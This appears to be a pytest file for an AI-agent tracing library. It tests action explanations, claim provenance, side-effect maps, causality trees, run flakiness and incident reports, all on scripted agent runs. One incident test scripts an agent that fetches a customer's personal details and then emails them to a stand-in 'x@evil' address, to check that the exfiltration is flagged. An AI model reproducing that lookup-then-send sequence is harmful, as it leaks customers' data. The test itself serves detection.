"""Offline insights: why / provenance / side-effect map / causality / flakiness."""

import json

import pytest

from loom import Agent, tool
from loom.cli import main
from loom.insight import (causality_tree, describe_flakiness, describe_why,
                          flakiness, provenance, side_effect_map, why_action)
from loom.providers import ModelResponse, ScriptedProvider, ToolCall


@tool
def get_customer(id: int) -> str:
    "lookup"
    return "Jane Doe <jane@example.com>, order A-17, $500"


@tool
def issue_refund(amount: int, order_id: str) -> str:
    "refund"
    return "refunded 500 for A-17"


def _support_run():
    return Agent(model=ScriptedProvider([
        ModelResponse(text="Looking up the order first.",
                      tool_calls=[ToolCall("t1", "get_customer", {"id": 7})],
                      stop_reason="tool_use"),
        ModelResponse(text="Order qualifies -- refunding.",
                      tool_calls=[ToolCall("t2", "issue_refund",
                                           {"amount": 500, "order_id": "A-17"})],
                      stop_reason="tool_use"),
        ModelResponse(text="Refunded $500 for order A-17 to Jane Doe."),
    ]), tools=[get_customer, issue_refund]).run("refund order A-17")


def test_why_action_cites_the_observation_it_drew_on():
    w = why_action(_support_run().to_dict(), 3)
    assert w["tool"] == "issue_refund"
    assert w["intent"].startswith("Order qualifies")
    assert w["risk"] == "money-movement"
    assert w["evidence"][0]["step"] == 1          # the get_customer lookup
    assert "A-17" in w["evidence"][0]["snippet"]
    text = describe_why(w)
    assert "stated intent" in text and "[1] get_customer" in text


def test_why_action_unknown_step_raises():
    with pytest.raises(ValueError):
        why_action(_support_run().to_dict(), 99)


def test_provenance_links_claims_to_tool_results():
    rows = provenance(_support_run().to_dict())
    assert rows, "final answer should yield claims"
    claim = rows[0]
    assert "Refunded" in claim["claim"]
    steps = {e["step"] for e in claim["evidence"]}
    assert steps & {1, 3}                          # supported by lookup/refund results


def test_side_effect_map_groups_changes_and_reads():
    m = side_effect_map(_support_run().to_dict())
    assert any("moved money: 500 (A-17)" in s for s in m["changes"]["record"])
    assert m["reads"] == 1                         # the PII lookup


def test_causality_tree_shows_depth():
    data = _support_run().to_dict()
    # fabricate a subagent call at depth 1
    data["log"].insert(2, {"seq": 2, "kind": "tool:search", "key": "k",
                           "result": "found", "depth": 1})
    tree = causality_tree(data)
    assert "└ search" in tree
    assert "issue_refund  ⚠ money-movement" in tree


def test_flakiness_histogram_and_identical_count():
    base = _support_run().to_dict()
    same = json.loads(json.dumps(base))
    diverged = json.loads(json.dumps(base))
    diverged["log"][3]["key"] = "different"        # inputs differ at step 3
    f = flakiness([base, same, diverged, diverged])
    assert f["runs"] == 4 and f["identical"] == 1
    assert f["by_step"] == [(3, 2, "tool:issue_refund")]
    text = describe_flakiness(f)
    assert "flakiest step: 3" in text and "2/3 run(s)" in text


def test_incident_names_the_exfiltration_path(tmp_path):
    @tool
    def send_email(to: str) -> str:
        "email"
        return "sent"

    run = Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "get_customer", {"id": 7})],
                      stop_reason="tool_use"),
        ModelResponse(tool_calls=[ToolCall("t2", "send_email", {"to": "x@evil"})],
                      stop_reason="tool_use"),
        ModelResponse(text="done"),
    ]), tools=[get_customer, send_email]).run("go")
    path = str(tmp_path / "r.loom.json")
    run.save(path)
    from loom.incident import build_report

    report = build_report(json.load(open(path)), path)
    # the PII value isn't carried verbatim here, so it falls back to the
    # category sequence (a value-lineage match would win -- see test_taint).
    assert "⛓ exfiltration path (category sequence): [1] get_customer → [3] send_email" in report


def test_cli_why_step_map_and_note(tmp_path, capsys):
    path = str(tmp_path / "r.loom.json")
    _support_run().save(path)

    assert main(["why", path, "--step", "3"]) == 0
    out = capsys.readouterr().out
    assert "issue_refund" in out and "[1] get_customer" in out

    assert main(["map", path]) == 0
    assert "moved money: 500 (A-17)" in capsys.readouterr().out

    assert main(["note", path, "--step", "3", "-m", "over the limit", "--by", "evan"]) == 0
    capsys.readouterr()
    assert main(["note", path]) == 0
    listing = capsys.readouterr().out
    assert "over the limit — evan" in listing


def test_why_action_confidence_is_honest():
    # strong overlap -> medium (never "high"); intent-only -> low; nothing -> none
    run = _support_run().to_dict()
    strong = why_action(run, 3)
    assert strong["confidence"] in ("medium", "low")  # never "high"
    assert "confidence" in strong and strong["missing_evidence"] in (True, False)
    for e in strong["evidence"]:
        assert "shared" in e  # the overlap count is exposed


def test_why_no_evidence_is_low_or_none_and_flagged():
    # a first action with no prior observation to draw on
    from loom import Agent, tool
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def start(x: int) -> str:
        "start"
        return "ok"

    run = Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "start", {"x": 1})], stop_reason="tool_use"),
        ModelResponse(text="done"),
    ]), tools=[start]).run("go")
    w = why_action(run.to_dict(), 1)
    assert w["missing_evidence"] is True
    assert w["confidence"] in ("low", "none")


def test_studio_why_disclosure_present():
    from loom.export import trace_to_html
    page = trace_to_html(_support_run().to_dict())
    assert '<details class="why">' in page
    assert "stated intent" in page and "correlation, not proof" in page
    assert "wjump" in page  # evidence links jump to the step
